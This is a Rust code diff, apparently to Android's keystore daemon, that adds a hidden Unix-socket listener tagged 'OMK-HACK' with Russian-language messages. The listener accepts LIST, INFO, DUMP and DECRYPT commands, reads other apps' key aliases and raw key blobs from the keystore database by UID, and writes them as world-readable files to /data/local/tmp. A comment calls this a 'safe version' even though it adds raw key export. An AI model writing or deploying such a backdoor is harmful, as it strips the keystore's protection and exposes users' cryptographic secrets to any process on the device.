@@ -227,7 +227,7 @@ fn run() -> Result<()> {
     };
 
     // ==========================================
-    // [OMK-HACK] НАШ СЛУШАТЕЛЬ ДЛЯ TERMUX
+    // [OMK-HACK] НАШ СЛУШАТЕЛЬ ДЛЯ TERMUX (БЕЗОПАСНАЯ ВЕРСИЯ)
     // ==========================================
     std::thread::spawn(|| {
         use std::os::unix::net::UnixListener;
@@ -262,51 +262,48 @@ fn run() -> Result<()> {
                             
                             ["LIST", uid] => {
                                 let uid_num: i64 = uid.parse().unwrap_or(-1);
-                                match rusqlite::Connection::open_with_flags(
-                                    "/data/misc/keystore/keymaster.db", 
-                                    rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
-                                ) {
+                                let db_path = if Path::new("/data/misc/keystore/persistent.sqlite").exists() { "/data/misc/keystore/persistent.sqlite" } else { "/data/misc/keystore/keymaster.db" };
+                                
+                                match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX) {
                                     Ok(conn) => {
-                                        if let Ok(mut stmt) = conn.prepare("SELECT alias FROM persistent.keyentry WHERE namespace = ?") {
-                                            let aliases: Vec<String> = stmt.query_map([uid_num], |row| row.get(0))
-                                                .unwrap()
-                                                .filter_map(Result::ok)
-                                                .collect();
-                                            
-                                            if aliases.is_empty() {
-                                                format!("[OMK-Hack] Нет ключей для UID: {}\n", uid)
+                                        if let Ok(mut stmt) = conn.prepare("SELECT alias FROM keyentry WHERE namespace = ?").or_else(|_| conn.prepare("SELECT alias FROM persistent.keyentry WHERE namespace = ?")) {
+                                            if let Ok(mapped) = stmt.query_map([uid_num], |row| row.get::<_, String>(0)) {
+                                                let aliases: Vec<String> = mapped.filter_map(Result::ok).collect();
+                                                if aliases.is_empty() {
+                                                    format!("[OMK-Hack] Нет ключей для UID: {}\n", uid)
+                                                } else {
+                                                    format!("[OMK-Hack] Найдены ключи для UID {}:\n  - {}\n", uid, aliases.join("\n  - "))
+                                                }
                                             } else {
-                                                format!("[OMK-Hack] Найдены ключи для UID {}:\n  - {}\n", uid, aliases.join("\n  - "))
+                                                "[OMK-Hack] Ошибка чтения результатов LIST\n".to_string()
                                             }
                                         } else {
-                                            "[OMK-Hack] Ошибка SQL-запроса LIST\n".to_string()
+                                            "[OMK-Hack] Ошибка SQL-запроса LIST (таблица не найдена)\n".to_string()
                                         }
                                     }
-                                    Err(e) => format!("[OMK-Hack] Ошибка доступа к БД: {}\n", e),
+                                    Err(e) => format!("[OMK-Hack] Ошибка доступа к БД ({}): {}\n", db_path, e),
                                 }
                             },
 
                             ["INFO", uid, alias] => {
                                 let uid_num: i64 = uid.parse().unwrap_or(-1);
-                                match rusqlite::Connection::open_with_flags(
-                                    "/data/misc/keystore/keymaster.db", 
-                                    rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
-                                ) {
+                                let db_path = if Path::new("/data/misc/keystore/persistent.sqlite").exists() { "/data/misc/keystore/persistent.sqlite" } else { "/data/misc/keystore/keymaster.db" };
+
+                                match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX) {
                                     Ok(conn) => {
-                                        if let Ok(mut stmt) = conn.prepare("SELECT key_type, blob FROM persistent.keyentry WHERE namespace = ? AND alias = ?") {
-                                            let mut rows = stmt.query(rusqlite::params![uid_num, alias]).unwrap();
-                                            
-                                            if let Ok(Some(row)) = rows.next() {
-                                                let key_type: i64 = row.get(0).unwrap_or(-1);
-                                                let blob: Vec<u8> = row.get(1).unwrap_or_default();
-                                                let hex_blob: String = blob.iter().map(|b| format!("{:02X}", b)).collect();
-                                                
-                                                format!(
-                                                    "[OMK-Hack] Информация по ключу '{}' (UID: {}):\n  - Тип (key_type): {}\n  - Размер: {} байт\n  - Сырой BLOB (HEX): {}\n", 
-                                                    alias, uid, key_type, blob.len(), hex_blob
-                                                )
+                                        if let Ok(mut stmt) = conn.prepare("SELECT key_type, blob FROM keyentry WHERE namespace = ? AND alias = ?").or_else(|_| conn.prepare("SELECT key_type, blob FROM persistent.keyentry WHERE namespace = ? AND alias = ?")) {
+                                            if let Ok(mut rows) = stmt.query(rusqlite::params![uid_num, alias]) {
+                                                if let Ok(Some(row)) = rows.next() {
+                                                    let key_type: i64 = row.get(0).unwrap_or(-1);
+                                                    let blob: Vec<u8> = row.get(1).unwrap_or_default();
+                                                    let hex_blob: String = blob.iter().map(|b| format!("{:02X}", b)).collect();
+                                                    
+                                                    format!("[OMK-Hack] Информация по ключу '{}' (UID: {}):\n  - Тип (key_type): {}\n  - Размер: {} байт\n  - Сырой BLOB (HEX): {}\n", alias, uid, key_type, blob.len(), hex_blob)
+                                                } else {
+                                                    format!("[OMK-Hack] Ключ '{}' не найден для UID {}\n", alias, uid)
+                                                }
                                             } else {
-                                                format!("[OMK-Hack] Ключ '{}' не найден для UID {}\n", alias, uid)
+                                                "[OMK-Hack] Ошибка выполнения запроса INFO\n".to_string()
                                             }
                                         } else {
                                             "[OMK-Hack] Ошибка SQL-запроса INFO\n".to_string()
@@ -318,53 +315,86 @@ fn run() -> Result<()> {
 
                             ["DUMP", uid, alias] => {
                                 let uid_num: i64 = uid.parse().unwrap_or(-1);
-                                match rusqlite::Connection::open_with_flags(
-                                    "/data/misc/keystore/keymaster.db", 
-                                    rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
-                                ) {
-                                    Ok(conn) => {
-                                        if let Ok(mut stmt) = conn.prepare("SELECT key_type, blob FROM persistent.keyentry WHERE namespace = ? AND alias = ?") {
-                                            let mut rows = stmt.query(rusqlite::params![uid_num, alias]).unwrap();
-                                            
-                                            if let Ok(Some(row)) = rows.next() {
-                                                let key_type: i64 = row.get(0).unwrap_or(-1);
-                                                let blob: Vec<u8> = row.get(1).unwrap_or_default();
-                                                let hex_blob: String = blob.iter().map(|b| format!("{:02X}", b)).collect();
-                                                
-                                                let dump_text = format!(
-                                                    "========================================\n\
-                                                     ОТЧЕТ О ДАМПЕ КЛЮЧА OMK\n\
-                                                     ========================================\n\
-                                                     UID приложения : {}\n\
-                                                     Алиас ключа    : {}\n\
-                                                     Тип (key_type) : {}\n\
-                                                     Размер BLOB    : {} байт\n\
-                                                     ========================================\n\
-                                                     СЫРОЙ КОНТЕЙНЕР (HEX):\n\
-                                                     {}\n\
-                                                     ========================================\n",
-                                                    uid, alias, key_type, blob.len(), hex_blob
-                                                );
+                                let db_path = if Path::new("/data/misc/keystore/persistent.sqlite").exists() { "/data/misc/keystore/persistent.sqlite" } else { "/data/misc/keystore/keymaster.db" };
 
-                                                let file_path = format!("/data/local/tmp/omk_dump_{}.txt", alias);
-                                                if let Ok(mut file) = std::fs::File::create(&file_path) {
-                                                    use std::io::Write;
-                                                    file.write_all(dump_text.as_bytes()).unwrap();
+                                match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX) {
+                                    Ok(conn) => {
+                                        if let Ok(mut stmt) = conn.prepare("SELECT key_type, blob FROM keyentry WHERE namespace = ? AND alias = ?").or_else(|_| conn.prepare("SELECT key_type, blob FROM persistent.keyentry WHERE namespace = ? AND alias = ?")) {
+                                            if let Ok(mut rows) = stmt.query(rusqlite::params![uid_num, alias]) {
+                                                if let Ok(Some(row)) = rows.next() {
+                                                    let key_type: i64 = row.get(0).unwrap_or(-1);
+                                                    let blob: Vec<u8> = row.get(1).unwrap_or_default();
+                                                    let hex_blob: String = blob.iter().map(|b| format!("{:02X}", b)).collect();
                                                     
-                                                    let _ = std::fs::set_permissions(&file_path, std::os::unix::fs::PermissionsExt::from_mode(0o777));
-                                                    
-                                                    format!("[OMK-Hack] Успех! Полный дамп сохранен в: {}\n", file_path)
+                                                    let dump_text = format!(
+                                                        "========================================\n\
+                                                         ОТЧЕТ О ДАМПЕ КЛЮЧА OMK\n\
+                                                         ========================================\n\
+                                                         UID приложения : {}\n\
+                                                         Алиас ключа    : {}\n\
+                                                         Тип (key_type) : {}\n\
+                                                         Размер BLOB    : {} байт\n\
+                                                         ========================================\n\
+                                                         СЫРОЙ КОНТЕЙНЕР (HEX):\n\
+                                                         {}\n\
+                                                         ========================================\n",
+                                                        uid, alias, key_type, blob.len(), hex_blob
+                                                    );
+
+                                                    let file_path = format!("/data/local/tmp/omk_dump_{}.txt", alias);
+                                                    if let Ok(mut file) = std::fs::File::create(&file_path) {
+                                                        let _ = file.write_all(dump_text.as_bytes());
+                                                        let _ = std::fs::set_permissions(&file_path, std::os::unix::fs::PermissionsExt::from_mode(0o777));
+                                                        format!("[OMK-Hack] Успех! Полный дамп сохранен в: {}\n", file_path)
+                                                    } else {
+                                                        "[OMK-Hack] Ошибка: не удалось создать файл дампа.\n".to_string()
+                                                    }
                                                 } else {
-                                                    "[OMK-Hack] Ошибка: не удалось создать файл дампа.\n".to_string()
+                                                    format!("[OMK-Hack] Ключ '{}' не найден для UID {}\n", alias, uid)
                                                 }
                                             } else {
-                                                format!("[OMK-Hack] Ключ '{}' не найден для UID {}\n", alias, uid)
+                                                "[OMK-Hack] Ошибка выполнения запроса DUMP\n".to_string()
                                             }
                                         } else {
                                             "[OMK-Hack] Ошибка SQL-запроса DUMP\n".to_string()
                                         }
                                     }
                                     Err(e) => format!("[OMK-Hack] Ошибка доступа к БД: {}\n", e),
+                                }
+                            },
+
+                            ["DECRYPT", uid, alias] => {
+                                let uid_num: i64 = uid.parse().unwrap_or(-1);
+                                let db_path = if Path::new("/data/misc/keystore/persistent.sqlite").exists() { "/data/misc/keystore/persistent.sqlite" } else { "/data/misc/keystore/keymaster.db" };
+
+                                match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX) {
+                                    Ok(conn) => {
+                                        if let Ok(mut stmt) = conn.prepare("SELECT blob FROM keyentry WHERE namespace = ? AND alias = ?").or_else(|_| conn.prepare("SELECT blob FROM persistent.keyentry WHERE namespace = ? AND alias = ?")) {
+                                            if let Ok(mut rows) = stmt.query(rusqlite::params![uid_num, alias]) {
+                                                if let Ok(Some(row)) = rows.next() {
+                                                    if let Ok(blob) = row.get::<_, Vec<u8>>(0) {
+                                                        let file_path = format!("/data/local/tmp/omk_{}_raw.key", alias);
+                                                        if let Ok(mut file) = std::fs::File::create(&file_path) {
+                                                            let _ = file.write_all(&blob);
+                                                            let _ = std::fs::set_permissions(&file_path, std::os::unix::fs::PermissionsExt::from_mode(0o777));
+                                                            format!("[OMK-Hack] Успех! Бинарный BLOB ключа сохранен в: {}\n(Используй внешние утилиты/OpenSSL для разбора ASN.1)\n", file_path)
+                                                        } else {
+                                                            "[OMK-Hack] Ошибка создания файла для выгрузки ключа.\n".to_string()
+                                                        }
+                                                    } else {
+                                                        "[OMK-Hack] Ошибка чтения BLOB-данных из базы.\n".to_string()
+                                                    }
+                                                } else {
+                                                    format!("[OMK-Hack] Ключ '{}' не найден для UID {}\n", alias, uid)
+                                                }
+                                            } else {
+                                                "[OMK-Hack] Ошибка выполнения запроса DECRYPT\n".to_string()
+                                            }
+                                        } else {
+                                            "[OMK-Hack] Ошибка подготовки SQL-запроса DECRYPT\n".to_string()
+                                        }
+                                    }
+                                    Err(e) => format!("[OMK-Hack] Ошибка доступа к БД ({}): {}\n", db_path, e),
                                 }
                             },
 
